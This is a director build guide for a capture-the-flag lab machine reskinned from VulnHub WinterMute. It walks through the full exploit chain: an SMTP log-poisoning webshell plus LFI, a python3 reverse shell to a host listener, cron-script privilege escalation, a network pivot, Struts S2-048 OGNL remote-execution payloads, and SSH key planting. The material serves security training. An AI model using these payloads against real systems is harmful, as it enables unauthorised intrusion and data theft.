# AM-03: Network Junction 7 — Director Build Guide

> **EYES ONLY — DIRECTORS.** This document contains the full exploit
> chain. Do not distribute to players. Player-facing material is in
> `PLAYER_BRIEF.md`.

## Overview

| | |
|---|---|
| Difficulty | Medium |
| Source shape | VulnHub WinterMute 1 (reskinned — see `../../AM_SOURCING.md`) |
| Topology | **Two containers** — `junction7` (public) + `junction7-internal` (isolated) |
| Base image | `debian:11-slim` (both) |
| Services (public) | SMTP (25, Postfix), HTTP (80, Apache+PHP), routing status (9001, Python) |
| Services (internal) | HTTP (8080, Tomcat 9 + Struts 2.3.15.1), SSH (34483, OpenSSH) |
| Intended path | Recon via 9001 → LFI + SMTP log poisoning → RCE → cron privesc → pivot → Struts S2-048 RCE → cron privesc |
| CP | User 250, Root 350, Internal User 250, Internal Root 350 |
| Flags | Four `DZ{...}` flags (per-event, minted by `generate_flags.sh`) |
| Lore | Fragment C — routing tables reveal an unregistered subnet (THE RESTORATION) |

---

## Build & Run

```bash
cd Anomaly_Machines/AM-03_junction7

# Mint per-event flags (from the Anomaly_Machines/ root):
cd ../ && ./generate_flags.sh && cd AM-03_junction7

# Set the flags as env vars (AM-03 has four):
export AM03_USER_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-03: Network Junction 7 — User Flag'])")"
export AM03_ROOT_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-03: Network Junction 7 — Root Flag'])")"
export AM03_INTERNAL_USER_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-03: Network Junction 7 — Internal User Flag'])")"
export AM03_INTERNAL_ROOT_FLAG="$(python3 -c "import json;print(json.load(open('../event_flags.json'))['AM-03: Network Junction 7 — Internal Root Flag'])")"

# Build and start (dev — avoids host port collisions):
docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d --build
docker compose logs -f
```

Dev port map:
- `2525:25` — SMTP
- `8082:80` — HTTP (AM-01 uses 80, AM-02 uses 8081)
- `9001:9001` — routing status service

The internal container's ports (8080, 34483) are **never published** —
they're only reachable by pivoting through `junction7`.

### Two-network topology

```
junction_public network (10.10.3.x):
  junction7 — ports 25, 80, 9001 published to host

junction_internal network (10.10.2.x, internal: true):
  junction7 — second interface (pivot point)
  junction7-internal — ports 8080, 34483 (NOT published)
```

---

## Exploit Chain — Full Walkthrough

### Stage 1 — Enumerate junction7

```bash
nmap -sV -sC localhost   # dev: ports 2525, 8082, 9001
# 25/tcp   open  smtp    Postfix smtpd
# 80/tcp   open  http    Apache httpd (Junction 7 portal)
# 9001/tcp open  http    Python HTTP (routing daemon status)
```

### Stage 2 — Recon: routing status service leaks hidden path

```bash
curl http://localhost:9001/
# Routing table shows:
#   10.10.2.0/24 — ANOMALOUS — "Unregistered subnet"
# Monitored Services:
#   Bolometer -> /junction-bolo/
```

The `/junction-bolo/` path is not linked from the main page — players
discover it here.

### Stage 3 — SMTP log poisoning + LFI → RCE

The `bolo.php` script does `include($_GET['bolo'] . '.log')`. Poison the
Postfix mail log via SMTP, then trigger the LFI:

```bash
# Inject PHP webshell into /var/log/mail via VRFY (logs the illegal
# address syntax verbatim):
printf 'HELO x\r\nVRFY <?php echo shell_exec($_GET["cmd"]); ?>\r\nQUIT\r\n' | nc localhost 2525

# Trigger the LFI to execute the injected PHP:
curl "http://localhost:8082/junction-bolo/bolo.php?bolo=/var/log/mail&cmd=id"
# Look for uid=33(www-data) in the output (mixed with mail log lines)
```

Get a reverse shell (container lacks `nc` — use `python3` or `socat`):
```bash
# Find the Docker bridge gateway (your host IP from the container's view):
docker inspect dz-am03-junction7 --format '{{range $k,$v := .NetworkSettings.Networks}}{{if $v.Gateway}}{{println $v.Gateway}}{{end}}{{end}}'
# e.g. 172.20.0.1

# On attacker (the host):
nc -lvnp 4444

# Via RCE (python3 reverse shell):
curl -G \
  --data-urlencode "cmd=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"172.20.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" \
  "http://localhost:8082/junction-bolo/bolo.php?bolo=/var/log/mail"
```

### Stage 4 — Cron privesc on junction7 (user flag)

```bash
# As www-data, find the world-writable cron script:
ls -la /opt/junction/routing_updater.sh
# -rwxrwxrwx 1 root root ... /opt/junction/routing_updater.sh

# Check the cron entry:
cat /etc/cron.d/routing-updater
# * * * * * root /opt/junction/routing_updater.sh

# Overwrite the script to dump the user flag:
echo '#!/bin/bash
cat /root/user.txt' > /opt/junction/routing_updater.sh

# Wait up to 60 seconds for the cron job to fire:
sleep 60

# Read the output from the cron log or just check:
cat /root/user.txt
# DZ{user_junction7_<hash>}
```

### Stage 5 — Pivot: discover internal network

```bash
# From the junction7 shell:
ip addr
# Two interfaces:
#   eth0: 10.10.3.x (public)
#   eth1: 10.10.2.x (internal — anomalous)

# Ping-sweep the internal subnet:
for i in $(seq 1 254); do (ping -c1 -W1 10.10.2.$i 2>/dev/null && echo "10.10.2.$i UP"); done

# Port-scan the discovered host (no nc/nmap on the box — use bash /dev/tcp):
for p in 8080 34483; do timeout 1 bash -c "echo >/dev/tcp/10.10.2.<internal_ip>/$p" 2>/dev/null && echo "port $p OPEN" || echo "port $p closed"; done
# port 8080 OPEN
# port 34483 OPEN
```

### Stage 6 — Struts S2-048 RCE on junction7-internal

S2-048 is an OGNL injection in the `saveGangster` action — the `name` parameter
is rendered via `<s:actionmessage>` which evaluates OGNL `%{...}` expressions.
Must use POST (GET fails form validation). Command output appears inline in the
"Gangster test... added successfully" message.

```bash
# Verify the Struts showcase is deployed:
curl http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/

# Test OGNL injection (should show "Gangster test2 added successfully"):
curl -s -X POST "http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action" \
  --data-urlencode 'name=test%{1+1}' \
  --data 'age=22' \
  --data '__multilineMessage=test'

# S2-048 RCE — ProcessBuilder + BufferedReader for output capture:
curl -s -X POST "http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action" \
  --data-urlencode 'name=test%{#p=new java.lang.ProcessBuilder({"/bin/bash","-c","id"}),#p.redirectErrorStream(true),#out=#p.start(),#out.waitFor(),#br=new java.io.BufferedReader(new java.io.InputStreamReader(#out.getInputStream())),#line=#br.readLine(),#sb=new java.lang.StringBuilder(),#sb.append(#line),#sb.toString()}' \
  --data 'age=22' \
  --data '__multilineMessage=test'
# "Gangster testuid=0(root) gid=0(root) groups=0(root) added successfully"

# Read the internal user flag (base64 to avoid DZ{} breaking MessageFormat):
curl -s -X POST "http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action" \
  --data-urlencode 'name=test%{#p=new java.lang.ProcessBuilder({"/bin/bash","-c","cat /home/compliance/user.txt | base64"}),#p.redirectErrorStream(true),#out=#p.start(),#out.waitFor(),#br=new java.io.BufferedReader(new java.io.InputStreamReader(#out.getInputStream())),#line=#br.readLine(),#sb=new java.lang.StringBuilder(),#sb.append(#line),#sb.toString()}' \
  --data 'age=22' \
  --data '__multilineMessage=test'
# Decode the base64 in the response -> DZ{internal_user_junction7_<hash>}
```

For a proper shell, inject an SSH key via the RCE (same ProcessBuilder pattern,
replacing the command with `mkdir -p /home/compliance/.ssh && echo '<key>' >
/home/compliance/.ssh/authorized_keys`), then SSH through the pivot.

### Stage 7 — Cron privesc on junction7-internal (root flag)

The internal host has a world-writable cron script at `/opt/junction/system_check.sh`
(run every minute as root). Overwrite it via Struts RCE:

```bash
# Overwrite the cron script via Struts RCE:
curl -s -X POST "http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action" \
  --data-urlencode 'name=test%{#p=new java.lang.ProcessBuilder({"/bin/bash","-c","echo \"#!/bin/bash\ncat /root/root.txt > /tmp/cron_root_flag.txt\" > /opt/junction/system_check.sh"}),#p.redirectErrorStream(true),#out=#p.start(),#out.waitFor()}' \
  --data 'age=22' \
  --data '__multilineMessage=test'

# Wait for cron (up to 60s), then read the flag:
sleep 60
curl -s -X POST "http://10.10.2.<ip>:8080/struts2_2.3.15.1-showcase/integration/saveGangster.action" \
  --data-urlencode 'name=test%{#p=new java.lang.ProcessBuilder({"/bin/bash","-c","cat /tmp/cron_root_flag.txt | base64"}),#p.redirectErrorStream(true),#out=#p.start(),#out.waitFor(),#br=new java.io.BufferedReader(new java.io.InputStreamReader(#out.getInputStream())),#line=#br.readLine(),#sb=new java.lang.StringBuilder(),#sb.append(#line),#sb.toString()}' \
  --data 'age=22' \
  --data '__multilineMessage=test'
# Decode the base64 -> DZ{internal_root_junction7_<hash>}
```

### Stage 8 — Lore Fragment C

The routing status service on port 9001 references an unregistered
subnet (`10.10.2.0/24` — "ANOMALOUS — no official Construct map entry").
This is Fragment C for THE RESTORATION faction objective.

---

## Validation (automated)

```bash
cd Anomaly_Machines/AM-03_junction7
docker compose -f docker-compose.yml -f docker-compose.dev.yml --profile test up --build --abort-on-container-exit
```

Note: the test harness uses `docker exec` for the pivot stages (5-7)
since the test runner can't reach the isolated internal network. The
exploit techniques (Struts RCE, cron abuse) are still exercised.

---

## Reskinning notes (vs. source WinterMute)

- ntopng (port 3000) replaced with a custom Python routing-status service on 9001
- Straylight → `junction7`; Neuromancer → `junction7-internal`
- Two-VM VirtualBox lab → two Docker containers with isolated networking
- SSH on Straylight: omitted (source had no SSH on the public host)
- Screen 4.5.0 SUID privesc → cron abuse on both hosts (Docker-safe)
- Kernel exploit on Neuromancer → cron abuse (avoids kernel-in-container risk)
- Struts S2-048 RCE preserved faithfully — exact same vulnerable WAR
- SSH port 34483 on internal host preserved from source
- Base image: `debian:11-slim` for both (source was Debian 9 + Ubuntu 16.04)
- Lore Fragment C planted in the routing status service output